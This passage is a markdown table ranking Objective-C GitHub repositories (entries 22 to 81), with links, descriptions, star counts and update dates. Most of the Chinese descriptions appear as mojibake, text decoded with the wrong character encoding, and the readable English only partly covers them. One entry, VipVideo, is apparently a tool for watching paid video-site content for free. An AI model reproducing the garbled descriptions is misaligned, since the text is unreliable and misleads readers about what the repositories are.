|22|[tigerAndBull/TABAnimated](https://github.com/tigerAndBull/TABAnimated)|A skeleton screen framework based on native for iOS. (‰∏Ä‰∏™Áî±iOSÂéüÁîüÁªÑ‰ª∂Êò†Â∞ÑÂá∫È™®Êû∂Â±èÁöÑÊ°ÜÊû∂ÔºåÂåÖÂê´Âø´ÈÄüÊ§çÂÖ•Ôºå‰ΩéËÄ¶ÂêàÔºåÂÖºÂÆπÂ§çÊùÇËßÜÂõæÁ≠âÁâπÁÇπÔºåÊèê‰æõÂõΩÂÜÖ‰∏ªÊµÅÈ™®Êû∂Â±èÂä®ÁîªÁöÑÂä†ËΩΩÊñπÊ°àÔºåÂêåÊó∂ÊîØÊåÅ‰∏äÊãâÂä†ËΩΩÊõ¥Â§ö„ÄÅËá™ÂÆöÂà∂Âä®Áîª„ÄÇ)|2.3k|Objective-C|10/27|
|23|[meili/MGJRouter](https://github.com/meili/MGJRouter)|‰∏Ä‰∏™È´òÊïà/ÁÅµÊ¥ªÁöÑ iOS URL Router|2.3k|Objective-C|07/24|
|24|[leancloud/ChatKit-OC](https://github.com/leancloud/ChatKit-OC)|Ê≠§È°πÁõÆÂ∑≤ÁªèÂ∫üÂºÉÔºå‰ª•Âêé‰∏çÂÜçÁª¥Êä§„ÄÇÊàë‰ª¨Êé®Âá∫‰∫ÜÂü∫‰∫é Swift SDK ÁöÑ Chat Demo„ÄÇ|2.2k|Objective-C|06/15|
|25|[iodefog/VipVideo](https://github.com/iodefog/VipVideo)|ÂêÑÂ§ßÁΩëÁ´ôvipËßÜÈ¢ëÂÖçË¥πËßÇÁúã Á≠â MacÁâà„ÄÇ‰ªòË¥πÁîµÂΩ±ÔºåVIP‰ºöÂëòÂâßÁ≠âÔºåÂéªÂπøÂëäÊí≠Êîæ„ÄÇËá™Áî®ËßÜÈ¢ëÊàñËÄÖÁîµÂΩ±URLÔºåÈü≥‰πêÁ†¥Ëß£URLÔºåCCTVÁ≠âÁîµËßÜÊí≠ÊîæURL|2.2k|Objective-C|07/02|
|26|[WillkYang/YYKline](https://github.com/WillkYang/YYKline)|iOS YYKlineÔºöKline„ÄÅChart„ÄÅVolume„ÄÅScroll„ÄÅScale„ÄÅMACD„ÄÅKDJ„ÄÅKÁ∫øÂõæ„ÄÅÂàÜÊó∂Âõæ...|2.2k|Objective-C|10/27|
|27|[objccn/articles](https://github.com/objccn/articles)|Articles for objccn.io. objc.ioÁöÑÂÆåÊï¥„ÄÅÂáÜÁ°Æ„ÄÅ‰ºòÈõÖÁöÑ‰∏≠ÊñáÁøªËØëÁâàÊú¨|2.1k|Objective-C|04/08|
|28|[zuoqing1988/ZQCNN](https://github.com/zuoqing1988/ZQCNN)|‰∏ÄÊ¨æÊØîmini-caffeÊõ¥Âø´ÁöÑForwardÂ∫ìÔºåËßâÂæóÂ•ΩÁî®ËØ∑ÁÇπÊòüÂïäÔºå400ÊòüÂÖ¨Â∏ÉÂø´ÈÄü‰∫∫ËÑ∏Ê£ÄÊµãÊ®°ÂûãÔºå500ÊòüÂÖ¨Â∏É106ÁÇπlandmarkÔºå600ÊòüÂÖ¨Â∏É‰∫∫Â§¥Ê£ÄÊµãÊ®°ÂûãÔºå700ÊòüÂÖ¨Â∏É‰∫∫ËÑ∏Ê£ÄÊµãÂ•óÈ§êÔºàÂÖ≠Áßçpnet,‰∏§ÁßçrnetÈöèÊÑèÊ∑∑Âêà‰ΩøÁî®Êª°Ë∂≥ÂêÑÁßçÈÄüÂ∫¶/Á≤æÂ∫¶Ë¶ÅÊ±ÇÔºâÔºå800ÊòüÂÖ¨Â∏ÉÊõ¥ÂáÜÁöÑ106ÁÇπÊ®°Âûã|2.0k|Objective-C|10/23|
|29|[eseedo/iOSCourse](https://github.com/eseedo/iOSCourse)|iOSÂºÄÂèëÂàùÂ≠¶ËÄÖÂÖ•Èó®|1.9k|Objective-C|05/16|
|30|[SilenceLove/HXPhotoPicker](https://github.com/SilenceLove/HXPhotoPicker)|ÂõæÁâá/ËßÜÈ¢ëÈÄâÊã©Âô® - ÊîØÊåÅLivePhoto„ÄÅGIFÂõæÁâáÈÄâÊã©„ÄÅ3DTouchÈ¢ÑËßà„ÄÅÂú®Á∫ø‰∏ãËΩΩiCloud‰∏äÁöÑËµÑÊ∫ê„ÄÅÁºñËæëÂõæÁâá/ËßÜÈ¢ë„ÄÅÊµèËßàÁΩëÁªúÂõæÁâá ÂäüËÉΩ    Imitation wx photo/image picker - support for LivePhoto, GIF image selection, 3DTouch preview, Download the resources on iCloud online, browse the web image function|1.9k|Objective-C|10/29|
|31|[pili-engineering/PLPlayerKit](https://github.com/pili-engineering/PLPlayerKit)|PLPlayerKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÂÖçË¥πÁöÑÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÊí≠ÊîæÂô® SDKÔºåÈááÁî®ÂÖ®Ëá™Á†îÁöÑË∑®Âπ≥Âè∞Êí≠ÊîæÂÜÖÊ†∏ÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÂäüËÉΩÂíå‰ºòÂºÇÁöÑÊÄßËÉΩÔºåÂèØÈ´òÂ∫¶ÂÆöÂà∂ÂåñÂíå‰∫åÊ¨°ÂºÄÂèë„ÄÇ|1.9k|Objective-C|05/22|
|32|[91renb/BRPickerView](https://github.com/91renb/BRPickerView)|BRPickerView Â∞ÅË£ÖÁöÑÊòØiOS‰∏≠Â∏∏Áî®ÁöÑÈÄâÊã©Âô®ÁªÑ‰ª∂Ôºå‰∏ªË¶ÅÂåÖÊã¨ÔºöÊó•ÊúüÈÄâÊã©Âô®ÔºàÊîØÊåÅÂπ¥ÊúàÊó•„ÄÅÂπ¥ÊúàÁ≠â15ÁßçÊó•ÊúüÊ†∑ÂºèÈÄâÊã©ÔºåÊîØÊåÅËÆæÁΩÆÊòüÊúü„ÄÅËá≥‰ªäÁ≠âÔºâ„ÄÅÂú∞ÂùÄÈÄâÊã©Âô®ÔºàÊîØÊåÅÁúÅÂ∏ÇÂå∫„ÄÅÁúÅÂ∏Ç„ÄÅÁúÅ‰∏âÁßçÂú∞Âå∫ÈÄâÊã©Ôºâ„ÄÅËá™ÂÆö‰πâÂ≠óÁ¨¶‰∏≤ÈÄâÊã©Âô®ÔºàÊîØÊåÅÂçïÂàó„ÄÅÂ§öÂàó„ÄÅ‰∫åÁ∫ßËÅîÂä®„ÄÅ‰∏âÁ∫ßËÅîÂä®ÈÄâÊã©Ôºâ„ÄÇÊîØÊåÅËá™ÂÆö‰πâ‰∏ªÈ¢òÊ†∑ÂºèÔºåÈÄÇÈÖçÊ∑±Ëâ≤Ê®°ÂºèÔºåÊîØÊåÅÂ∞ÜÈÄâÊã©Âô®ÁªÑ‰ª∂Ê∑ªÂä†Âà∞ÊåáÂÆöÂÆπÂô®ËßÜÂõæ„ÄÇ|1.8k|Objective-C|09/25|
|33|[pujiaxin33/JXPagingView](https://github.com/pujiaxin33/JXPagingView)|Á±ª‰ººÂæÆÂçö‰∏ªÈ°µ„ÄÅÁÆÄ‰π¶‰∏ªÈ°µÁ≠âÊïàÊûú„ÄÇÂ§öÈ°µÈù¢ÂµåÂ•óÔºåÊó¢ÂèØ‰ª•‰∏ä‰∏ãÊªëÂä®Ôºå‰πüÂèØ‰ª•Â∑¶Âè≥ÊªëÂä®ÂàáÊç¢È°µÈù¢„ÄÇÊîØÊåÅHeaderViewÊÇ¨ÊµÆ„ÄÅÊîØÊåÅ‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩÊõ¥Â§ö„ÄÇ|1.8k|Objective-C|09/23|
|34|[changsanjiang/SJVideoPlayer](https://github.com/changsanjiang/SJVideoPlayer)|iOS VideoPlayer MediaPlayer video player media player Áü≠ËßÜÈ¢ëÊí≠ÊîæÂô® ÂèØÊé•ÂÖ• ijkplayer aliplayer alivodplayer plplayer|1.7k|Objective-C|10/22|
|35|[youusername/magnetX](https://github.com/youusername/magnetX)|ËµÑÊ∫êÊêúÁ¥¢ÂûãËΩØ‰ª∂ macOS OSX magnet|1.6k|Objective-C|07/15|
|36|[zhengwenming/WeChat](https://github.com/zhengwenming/WeChat)|ÂÆûÁé∞Á±ª‰ººÂæÆ‰ø°ÊúãÂèãÂúàÊàñËÄÖQQÁ©∫Èó¥ÔºåËØÑËÆ∫ÂõûÂ§çÔºå‰πùÂÆ´Ê†ºÂ∏ÉÂ±Ä„ÄÇÂ§ÑÁêÜÈîÆÁõòÂºπÂá∫ÂêéÂÆö‰ΩçÂà∞ÂΩìÂâçÁÇπÂáªÁöÑË¢´ËØÑËÆ∫‰∫∫Â§Ñ„ÄÇÂè¶ÔºöÊªëÂä®Êó∂ÂÄôFPSÂú®57-60‰πãÈó¥ÔºåÁ∫µ‰∫´‰∏ùÊªëÔºÅ|1.6k|Objective-C|04/13|
|37|[lefex/iWeChat](https://github.com/lefex/iWeChat)|‰ªé 0 ÂºÄÂßãËß£Âà®‰∏Ä‰∏™ AppÔºå‰ª•ÂæÆ‰ø°‰∏∫‰æã|1.5k|Objective-C|09/26|
|38|[kingsic/SGQRCode](https://github.com/kingsic/SGQRCode)|The easy to use Barcode and QR code scan library for iOS„ÄêiOS ÂéüÁîü‰∫åÁª¥Á†ÅÁîüÊàê‰∏éÊâ´Êèè -> È´ò‰ªøÂæÆ‰ø°„Äë|1.5k|Objective-C|10/22|
|39|[zhenglibao/FlexLib](https://github.com/zhenglibao/FlexLib)|FlexLibÊòØ‰∏Ä‰∏™Âü∫‰∫éflexboxÊ®°ÂûãÔºå‰ΩøÁî®xmlÊñá‰ª∂ËøõË°åÁïåÈù¢Â∏ÉÂ±ÄÁöÑÊ°ÜÊû∂ÔºåËûçÂêà‰∫ÜwebÂø´ÈÄüÂ∏ÉÂ±ÄÁöÑËÉΩÂäõÔºåËÆ©iOSÁïåÈù¢ÂºÄÂèëÂÉèÂÜôÁΩëÈ°µ‰∏ÄÊ†∑ÁÆÄÂçïÂø´ÈÄü|1.5k|Objective-C|10/26|
|40|[kingsic/SGPagingView](https://github.com/kingsic/SGPagingView)|A powerful and easy to use segment control „ÄêQQ„ÄÅÊ∑òÂÆù„ÄÅÂæÆÂçö„ÄÅËÖæËÆØ„ÄÅÁΩëÊòìÊñ∞Èóª„ÄÅ‰ªäÊó•Â§¥Êù°Á≠âÊ†áÈ¢òÊªöÂä®ËßÜÂõæ„Äë|1.4k|Objective-C|07/17|
|41|[suifengqjn/TBPlayer](https://github.com/suifengqjn/TBPlayer)|ËßÜÈ¢ëËæπ‰∏ãËæπÊí≠Êí≠ÔºåÊääÊí≠ÊîæÂô®Êí≠ÊîæËøáÁöÑÊï∞ÊçÆÊµÅÁºìÂ≠òÂà∞Êú¨Âú∞ÔºåÊîØÊåÅÊãñÂä®„ÄÇÈááÁî®avplayer|1.3k|Objective-C|06/28|
|42|[netease-im/NIM_iOS_UIKit](https://github.com/netease-im/NIM_iOS_UIKit)|ÁΩëÊòì‰∫ë‰ø° iOS UI ÁªÑ‰ª∂ÔºåÊèê‰æõËÅäÂ§©ÁïåÈù¢ÔºåÊñáÊú¨Ê∂àÊÅØÔºåÂõæÁâáÊ∂àÊÅØÔºåËØ≠Èü≥Ê∂àÊÅØÔºåËßÜÈ¢ëÊ∂àÊÅØÔºåÂú∞ÁêÜ‰ΩçÁΩÆÊ∂àÊÅØÔºåËá™ÂÆö‰πâÊ∂àÊÅØÔºàÈòÖÂêéÂç≥ÁÑöÔºâÁ≠âÊ∂àÊÅØÁ§∫‰æã„ÄÇ#Êé®ËçêÂ•ΩÂèã‰ΩøÁî®ÁΩëÊòì‰∫ë‰ø°#ÊØèÂçïÂèØÂæó500ÂÖÉ‰∫¨‰∏úÂç°ÔºÅhttps://yunxin.163.com/promotion/recommend|1.3k|Objective-C|10/22|
|43|[jpush/jpush-react-native](https://github.com/jpush/jpush-react-native)|JPush's officially supported React Native plugin (Android & iOS). ÊûÅÂÖâÊé®ÈÄÅÂÆòÊñπÊîØÊåÅÁöÑ React Native Êèí‰ª∂ÔºàAndroid & iOSÔºâ„ÄÇ|1.2k|Objective-C|09/23|
|44|[LeoMobileDeveloper/Blogs](https://github.com/LeoMobileDeveloper/Blogs)|‰∏ÄÁÇπÂøÉÂæó - iOS,Swift,React Native,Python...|1.2k|Objective-C|07/23|
|45|[WillkYang/YYStock](https://github.com/WillkYang/YYStock)|iOS YYStock-v2.0Ôºötimeline chart, long press, pinch, full-screenÔºåKÁ∫øÂõæ...|1.2k|Objective-C|09/10|
|46|[jezzmemo/JJException](https://github.com/jezzmemo/JJException)|Protect the objective-c application(‰øùÊä§App‰∏çÈó™ÈÄÄ)|1.2k|Objective-C|09/05|
|47|[li6185377/LKDBHelper-SQLite-ORM](https://github.com/li6185377/LKDBHelper-SQLite-ORM)|ÂÖ®Ëá™Âä®ÁöÑÊèíÂÖ•,Êü•ËØ¢,Êõ¥Êñ∞,Âà†Èô§Ôºå an automatic database operation  thread-safe and not afraid of recursive deadlock|1.2k|Objective-C|09/15|
|48|[GGGHub/Reader](https://github.com/GGGHub/Reader)|iOSÂü∫‰∫éCoreTextÂÆûÁé∞ÁöÑÁîµÂ≠ê‰π¶ÈòÖËØªÂô®ÔºåÊîØÊåÅtxtÔºåepubÊ†ºÂºè|1.1k|Objective-C|06/04|
|49|[liangdahong/BMLongPressDragCellCollectionView](https://github.com/liangdahong/BMLongPressDragCellCollectionView)|üéâ üéâ üéâ üéâ üéâ  ËÆ©‰Ω†ËΩªÊùæÂÆûÁé∞Á±ª‰ººÊîØ‰ªòÂÆùÁöÑÊãñÊãΩÈáçÊéíÂäüËÉΩ, ÊîØÊåÅÂêÑÁßçËá™ÂÆö‰πâÊìç‰Ωú„ÄÇ|1.0k|Objective-C|09/24|
|50|[lixiang1994/LEEAlert](https://github.com/lixiang1994/LEEAlert)|‰ºòÈõÖÁöÑÂèØËá™ÂÆö‰πâ Alert ActionSheet|1.0k|Objective-C|10/10|
|51|[DaidoujiChen/Dai-Hentai](https://github.com/DaidoujiChen/Dai-Hentai)|‰∏ÄÂÄãÊôÆÈÄöÁöÑÁúãÊº´Áï´ App|945|Objective-C|10/14|
|52|[yulingtianxia/TBActionSheet](https://github.com/yulingtianxia/TBActionSheet)|A Custom&Powerful Action Sheet For iOS. ‰∏Ä‰∏™ ActionSheet Êª°Ë∂≥ÊâÄÊúâÊ†∑ÂºèÔºÅË∂ÖÈ´òËá™Áî±Â∫¶ÁöÑÂèØÂÆöÂà∂ÔºÅ|935|Objective-C|06/05|
|53|[SunshineBrother/JHBlog](https://github.com/SunshineBrother/JHBlog)|iOSÂºÄÂèëÔºöÊàëÁöÑÂàùÁ∫ßÂà∞‰∏≠Á∫ßÁöÑÊôãÁ∫ß‰πãË∑Ø|909|Objective-C|10/24|
|54|[CoderMikeHe/MHDevelopExample_Objective_C](https://github.com/CoderMikeHe/MHDevelopExample_Objective_C)|üî•üî•üî•  iOSÂºÄÂèëÊäÄÊúØË¶ÅÁÇπÊ±áÊÄªÔºåÊ†∏ÂøÉÂäüËÉΩÈÖçÂ§áÊñáÊ°£„ÄÇË°®ÊÉÖÈîÆÁõòÂ∏ÉÂ±Ä„ÄÅÂ§ßÊñá‰ª∂ÂàÜÁâá‰∏ä‰º†„ÄÅÂü∫‰∫éMVCÁöÑÂü∫Á±ªËÆæËÆ°„ÄÅMVVM+RACÂÆûË∑µ„ÄÅÂæÆ‰ø°ÊúãÂèãÂúàÂÆûÁé∞ÊñπÊ°àÁ≠â„ÄÇ|876|Objective-C|06/23|
|55|[netyouli/WHC_AutoLayoutKit](https://github.com/netyouli/WHC_AutoLayoutKit)|iOS and Mac OS X platforms currently in use the fastest the simplest development to build the UI layout automatically open source library, strong dynamic layout constraint handling capacityÔºåiOS/Mac OS XÂπ≥Âè∞‰∏äÁõÆÂâç‰ΩøÁî®ÊúÄÁÆÄÂçïÂºÄÂèëÊûÑÂª∫UIÈÄüÂ∫¶ÊúÄÂø´ÁöÑËá™Âä®Â∏ÉÂ±ÄÂºÄÊ∫êÂ∫ìÔºåÂº∫ÊÇçÁöÑÂä®ÊÄÅÂ∏ÉÂ±ÄÁ∫¶ÊùüÂ§ÑÁêÜËÉΩÂäõ|859|Objective-C|05/31|
|56|[QuintGao/GKPageScrollView](https://github.com/QuintGao/GKPageScrollView)|iOSÁ±ª‰ººÂæÆÂçö„ÄÅÊäñÈü≥„ÄÅÁΩëÊòì‰∫ëÁ≠â‰∏™‰∫∫ËØ¶ÊÉÖÈ°µÊªëÂä®ÂµåÂ•óÊïàÊûú|840|Objective-C|10/22|
|57|[ksvc/KSYLive_iOS](https://github.com/ksvc/KSYLive_iOS)|ÈáëÂ±±‰∫ëÁõ¥Êí≠SDK [ iOSÊé®ÊµÅ+Êí≠Êîæ ]ËûçÂêàÁâà ÊîØÊåÅÁæéÈ¢úÊª§Èïú(Beauty Filter)„ÄÅÁæéÂ£∞(Beauty Voice)„ÄÅËΩØÁ°¨Áºñ(Software/Hardware Encoder) „ÄÅÁΩëÁªúËá™ÈÄÇÂ∫î(Network Auto Adapt)„ÄÅÊ∑∑Èü≥(Audio Mixer)„ÄÅÊ∑∑Âìç(Reverb)„ÄÅÁîª‰∏≠Áîª(PIP)|833|Objective-C|04/19|
|58|[renmoqiqi/100-Days-Of-iOS-DataStructure-Algorithm](https://github.com/renmoqiqi/100-Days-Of-iOS-DataStructure-Algorithm)|100Â§©iOSÊï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ïÂÆûÊàò |828|Objective-C|03/25|
|59|[yuwind/HHTransition](https://github.com/yuwind/HHTransition)|‰∏ªÊµÅËΩ¨Âú∫Âä®ÁîªÔºåÊó†‰æµÂÖ•ÔºåAPIÁÆÄÂçïÊòìÁî®„ÄÇ|824|Objective-C|09/30|
|60|[wildfirechat/ios-chat](https://github.com/wildfirechat/ios-chat)|ÂºÄÊ∫êÁöÑÂç≥Êó∂ÈÄöËÆØ(ÈáéÁÅ´IM)Á≥ªÁªü|794|Objective-C|10/29|
|61|[lyb5834/YBPopupMenu](https://github.com/lyb5834/YBPopupMenu)|Âø´ÈÄüÈõÜÊàêpopupMenu|790|Objective-C|06/01|
|62|[CoderMikeHe/WeChat](https://github.com/CoderMikeHe/WeChat)|üî• iOS Âà©Áî®MVVM + RAC + ViewModel-Based NavigationÊù•Êê≠Âª∫ÂæÆ‰ø°(WeChat 7.0.0+)ÁöÑÊï¥‰ΩìÂü∫Êú¨Êû∂ÊûÑÔºå‰ª•ÂèäÂÆûÁé∞ÂæÆ‰ø°ÊúãÂèãÂúà„ÄÅÈÄöËÆØÂΩï„ÄÅ‰∏ãÊãâÂ∞èÁ®ãÂ∫è„ÄÅÊêúÁ¥¢Á≠â‰∏ªË¶ÅÂäüËÉΩÔºå‰ª£Á†ÅËßÑËåÉÊÉä‰∏∫Â§©‰∫∫„ÄÅÊ≥®ÈáäËØ¶Ëß£‰ª§‰∫∫ÂèëÊåá„ÄÅÁªÜËäÇÂ§ÑÁêÜÁ≤æÁõäÊ±ÇÁ≤æ„ÄÅÊ†∏ÂøÉÂäüËÉΩÈÖçÂ§áÊñáÊ°£„ÄÅÊé•Ëøë98%ËøòÂéüÂ∫¶ÁöÑÂéüÁîüAppËßÜËßâ‰ΩìÈ™åÔºå‰ª£Á†Å‰∏çÂ§öÔºåÊ≥®ÈáäÂ§ö„ÄÇÔºàÊåÅÁª≠Êõ¥Êñ∞ÔºåÊï¨ËØ∑ÊúüÂæÖÔºåÊ¨¢ËøéStarÂíåFork‚Ä¶Ôºâ|758|Objective-C|10/27|
|63|[ChinaArJun/Tencent-NOW](https://github.com/ChinaArJun/Tencent-NOW)|üî•üî•üî•iOSËßÜÈ¢ëÁõ¥Êí≠:‰ªøËÖæËÆØÊóó‰∏ã < NOW > Áõ¥Êí≠¬†ÊñóÈ±º ÊäñÈü≥ ÁÅ´Â±±ËßÜÈ¢ë Ëä±Ê§í ÁÜäÁå´ YY ÈôåÈôå Êò†ÂÆ¢ Áõ¥Êí≠APP  iOS  Live video|749|Objective-C|05/05|
|64|[QuintGao/GKPhotoBrowser](https://github.com/QuintGao/GKPhotoBrowser)|iOS‰ªøÂæÆ‰ø°„ÄÅ‰ªäÊó•Â§¥Êù°Á≠âÂõæÁâáÊµèËßàÂô®|747|Objective-C|10/22|
|65|[didi/echo](https://github.com/didi/echo)|EchoÊòØ‰∏ÄÊ¨æÊ°åÈù¢Á´ØË∞ÉËØïÂ∑•ÂÖ∑ÔºåÊó®Âú®ÊèêÈ´òÂÆ¢Êà∑Á´ØÁöÑÁ†îÂèëË∞ÉËØïÊïàÁéá|735|Objective-C|09/29|
|66|[czl0325/ZLCollectionView](https://github.com/czl0325/ZLCollectionView)|‰∏∫Â∫îÂØπÁ±ª‰ººÊ∑òÂÆùÈ¶ñÈ°µÔºå‰∫¨‰∏úÈ¶ñÈ°µÔºåÂõΩÁæéÈ¶ñÈ°µÁ≠âÂ§çÊùÇÂ∏ÉÂ±ÄËÄåÂÜôÁöÑCollectionview„ÄÇÂü∫‰∫éUICollectionViewÂÆûÁé∞ÔºåÁõÆÂâçÊîØÊåÅÊ†áÁ≠æÂ∏ÉÂ±ÄÔºåÂàóÂ∏ÉÂ±ÄÔºåÁôæÂàÜÊØîÂ∏ÉÂ±ÄÔºåÂÆö‰ΩçÂ∏ÉÂ±ÄÔºåÂ°´ÂÖÖÂºèÂ∏ÉÂ±ÄÔºåÁÄëÂ∏ÉÊµÅÂ∏ÉÂ±ÄÁ≠â„ÄÇÊîØÊåÅÁ∫µÂêëÂ∏ÉÂ±ÄÂíåÊ®™ÂêëÂ∏ÉÂ±ÄÔºåÂèØ‰ª•Ê†πÊçÆ‰∏çÂêåÁöÑsectionËÆæÁΩÆ‰∏çÂêåÁöÑÂ∏ÉÂ±ÄÔºåÊîØÊåÅÊãñÂä®cellÔºåÂ§¥ÈÉ®ÊÇ¨ÊµÆÔºåËÆæÁΩÆsectionËÉåÊôØËâ≤ÂíåËá™ÂÆö‰πâsectionËÉåÊôØviewÔºåÂêëËá™ÂÆö‰πâËÉåÊôØview‰º†ÈÄíËá™ÂÆö‰πâÊñπÊ≥ï„ÄÇÂÆûÁé∞‰∫ÜÁîµÂΩ±ÈÄâÂ∫ßÁ≠âÈ´òÈöæÂ∫¶ÁöÑÂ∏ÉÂ±Ä„ÄÇ|734|Objective-C|09/08|
|67|[Tencent/vap](https://github.com/Tencent/vap)|VAPÊòØ‰ºÅÈπÖÁîµÁ´ûÂºÄÂèëÔºåÁî®‰∫éÊí≠ÊîæÁâπÊïàÂä®ÁîªÁöÑÂÆûÁé∞ÊñπÊ°à„ÄÇÂÖ∑ÊúâÈ´òÂéãÁº©Áéá„ÄÅÁ°¨‰ª∂Ëß£Á†ÅÁ≠â‰ºòÁÇπ„ÄÇÂêåÊó∂ÊîØÊåÅ iOS,Android,Web Âπ≥Âè∞„ÄÇ|732|Objective-C|10/29|
|68|[lixiang1994/LEETheme](https://github.com/lixiang1994/LEETheme)|‰ºòÈõÖÁöÑ‰∏ªÈ¢òÁÆ°ÁêÜÂ∫ì- ‰∏ÄË°å‰ª£Á†ÅÂÆåÊàêÂ§öÊ†∑ÂºèÂàáÊç¢|728|Objective-C|09/01|
|69|[LoSenTrad/LSTPopView](https://github.com/LoSenTrad/LSTPopView)|LSTPopView iOS‰∏áËÉΩÂºπÁ™ó (QQÁæ§:1045568246 ÂæÆ‰ø°:a_LSTKit)|724|Objective-C|08/11|
|70|[wsl2ls/iOS_Tips](https://github.com/wsl2ls/iOS_Tips)|iOSÁöÑ‰∏Ä‰∫õÁ§∫‰æãÔºåÊåÅÁª≠Êõ¥Êñ∞‰∏≠Ôºö1„ÄÅAVFoundation È´ò‰ªøÂæÆ‰ø°Áõ∏Êú∫ÊãçÊëÑÂíåÁºñËæë 2„ÄÅAVFoundation ‰∫∫ËÑ∏Ê£ÄÊµã„ÄÅÂÆûÊó∂Êª§Èïú„ÄÅÈü≥ËßÜÈ¢ëÁºñËß£Á†Å„ÄÅGPUImageÊ°ÜÊû∂ÁöÑ‰ΩøÁî®Á≠âÈü≥ËßÜÈ¢ëÁõ∏ÂÖ≥ÂÜÖÂÆπ    3„ÄÅOpenGLES    4„ÄÅLeetCodeÁÆóÊ≥ïÁªÉ‰π†   5„ÄÅiOS CrashÈò≤Êä§    6„ÄÅWKWebViewÁõ∏ÂÖ≥ÁöÑÂÜÖÂÆπ  Á≠â........|720|Objective-C|10/29|
|71|[skx926/KSPhotoBrowser](https://github.com/skx926/KSPhotoBrowser)|A beautiful photo browser with interactive dismissal animation.‰∏Ä‰∏™Â∞èËÄåÁæéÁöÑÂõæÁâáÊµèËßàÂô®„ÄÇ|709|Objective-C|10/04|
|72|[svga/SVGAPlayer-iOS](https://github.com/svga/SVGAPlayer-iOS)|Similar to Lottie. Render After Effects / Animate CC (Flash) animations natively on Android and iOS, Web.  ‰ΩøÁî® SVGAPlayer Âú® Android„ÄÅiOS„ÄÅWeb‰∏≠Êí≠Êîæ After Effects / Animate CC (Flash) Âä®Áîª„ÄÇ|705|Objective-C|10/15|
|73|[CRAnimation/CRBoxInputView](https://github.com/CRAnimation/CRBoxInputView)|Verify code input view. Support security type for password.Áü≠‰ø°È™åËØÅÁ†ÅËæìÂÖ•Ê°ÜÔºåÊîØÊåÅÂØÜÊñáÊ®°Âºè|697|Objective-C|06/11|
|74|[TonyReet/TYSnapshotScroll](https://github.com/TonyReet/TYSnapshotScroll)|‰∏ÄÂè•‰ª£Á†Å‰øùÂ≠òÊà™ÂõæÔºåÂ∞Ü UIScrollView UITableView UICollectionView UIWebView WKWebView  ÁΩëÈ°µ ‰øùÂ≠ò ‰∏∫ ÈïøÂõæ Êü•Áúã„ÄÇSave the scroll view page as an image,support UIScrollView,UITableView,UICollectionView,UIWebView,WKWebView.(Support iOS13)|689|Objective-C|08/27|
|75|[yiplee/YPNavigationBarTransition](https://github.com/yiplee/YPNavigationBarTransition)|A Full functional UINavigationBar framework for making bar transition more natural! You don't need to call any UINavigationBar api, implementing YPNavigationBarConfigureStyle protocol for your view controller instead.                ÔºàÁ±ª‰ººÂæÆ‰ø° iOS Navigation Bar ÁöÑÂàáÊç¢ÊñπÊ°àÔºâ|674|Objective-C|06/28|
|76|[tencentyun/MLVBSDK](https://github.com/tencentyun/MLVBSDK)|ÁßªÂä®Áõ¥Êí≠ SDKÔºåÂõΩÂÜÖ‰∏ãËΩΩÈïúÂÉèÔºö|617|Objective-C|10/26|
|77|[pikacode/EBBannerView](https://github.com/pikacode/EBBannerView)|Just 1 lineÔºöShow a banner the same as iOS  9~13 Notification, or show a custom view. Âè™ÈúÄ‰∏ÄË°å‰ª£Á†ÅÔºöÂ±ïÁ§∫Ë∑ü iOS Á≥ªÁªü‰∏ÄÊ†∑ÁöÑÊé®ÈÄÅÈÄöÁü•Ê®™ÂπÖÔºåÊàñÂ±ïÁ§∫‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ view„ÄÇÊîØÊåÅÊ®™Â±è„ÄÅËá™Âä®ÈÄÇÂ∫îÂêÑÁßçÊú∫Âûã„ÄÅËá™Âä®Â£∞Èü≥/ÈúáÂä®„ÄÇ|607|Objective-C|04/24|
|78|[QuintGao/GKNavigationBarViewController](https://github.com/QuintGao/GKNavigationBarViewController)|iOSËá™ÂÆö‰πâÂØºËà™Ê†è-ÂØºËà™Ê†èËÅîÂä®|597|Objective-C|10/23|
|79|[HeathWang/HWPanModal](https://github.com/HeathWang/HWPanModal)|HWPanModal presents controller from bottom and drag to dismiss, high customize. iOS13 default modalPresentationStyle. ‰ªªÊÑèÂΩ¢ÂºèÁöÑÂ∫ïÈÉ®ÂºπÊ°ÜÂä®ÁîªÔºõÂ§¥Êù°„ÄÅÁü•‰πé„ÄÅÊäñÈü≥ÂºπÂá∫ËØÑËÆ∫ÊïàÊûúÔºõÂú∞ÂõæÊµÆÂ±ÇÔºåiOS13 presentÈªòËÆ§Ê®°ÊÄÅÊïàÊûú„ÄÇ|591|Objective-C|10/20|
|80|[netyouli/WHC_ModelSqliteKit](https://github.com/netyouli/WHC_ModelSqliteKit)|‰∏ì‰∏öÁöÑORMÊï∞ÊçÆÂ∫ìÊìç‰ΩúÂºÄÊ∫êÂ∫ìÔºåÁ∫øÁ®ãÂÆâÂÖ®ÔºåÈ´òÊÄßËÉΩÊ®°ÂûãÂØπË±°Â≠òÂÇ®SqliteÂºÄÊ∫êÂ∫ìÔºåÁúüÊ≠£ÂÆûÁé∞‰∏ÄË°å‰ª£Á†ÅÊìç‰ΩúÊï∞ÊçÆÂ∫ìÔºåËÆ©Êï∞ÊçÆÂ∫ìÂ≠òÂÇ®ÂèòÂæóÁÆÄÂçï Professional database storage solutions, thread safe, high-performance model object storage Sqlite open source library, realize one line of code database operation, simple database storage|590|Objective-C|05/31|
|81|[shabake/GHDropMenuDemo](https://github.com/shabake/GHDropMenuDemo)|:sunny::sunny: ‰ªø‰∫¨‰∏ú/ÁæéÂõ¢ÁîµÂïÜÁ≠õÈÄâËèúÂçï ÁîµÂïÜÁ≠õÈÄâËèúÂçï ÁîµÂïÜÈÄöÁî®Á≠õÈÄâËèúÂçï:tennis::tennis: Imitation Jingdong / Meituan e-commerce screening menu E-commerce screening menu E-commerce general screening menu|580|Objective-C|08/06|
